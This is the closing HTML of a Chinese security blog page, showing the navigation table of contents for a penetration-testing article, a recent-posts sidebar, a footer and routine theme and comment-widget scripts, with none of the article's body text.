class="toc-number">2.2.</span> <span class="toc-text">流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.漏洞探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.3.</span> <span class="toc-text">3.内网转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.2.4.</span> <span class="toc-text">4. 内网横向渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.2.5.</span> <span class="toc-text">5.权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">2.2.6.</span> <span class="toc-text">6. 痕迹清理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">实战复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0"><span class="toc-number">3.1.</span> <span class="toc-text">扫描后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%9C%E6%83%B3"><span class="toc-number">3.2.</span> <span class="toc-text">猜想</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95"><span class="toc-number">3.3.</span> <span class="toc-text">成功登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%B8%8E%E7%BB%B4%E6%9D%83"><span class="toc-number">3.4.</span> <span class="toc-text">提权与维权</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2021/07/31/hello-world/" title="Hello World">Hello World</a><time datetime="2021-07-31T14:18:47.559Z" title="发表于 2021-07-31 22:18:47">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="三种xss的区别"/></a><div class="content"><a class="title" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别">三种xss的区别</a><time datetime="2021-07-31T13:23:29.000Z" title="发表于 2021-07-31 21:23:29">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie"><img src="/img/image/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cookie"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie">Cookie</a><time datetime="2021-07-31T13:22:32.000Z" title="发表于 2021-07-31 21:22:32">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译"><img src="/img/image/19.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预编译"/></a><div class="content"><a class="title" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译">预编译</a><time datetime="2021-07-31T13:19:28.000Z" title="发表于 2021-07-31 21:19:28">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LDAP"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP">LDAP</a><time datetime="2021-07-31T13:17:25.000Z" title="发表于 2021-07-31 21:17:25">2021-07-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/image/4.png)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By h0ld1rs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'VW87gUH9lGz0MqQ26R0dxvzS-gzGzoHsz',
+      appKey: 'hXDx5AOht2WentElxJRM8xnK',
+      placeholder: '来啊，快活啊!',
+      avatar: 'monsterid',
+      meta: 'nick'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
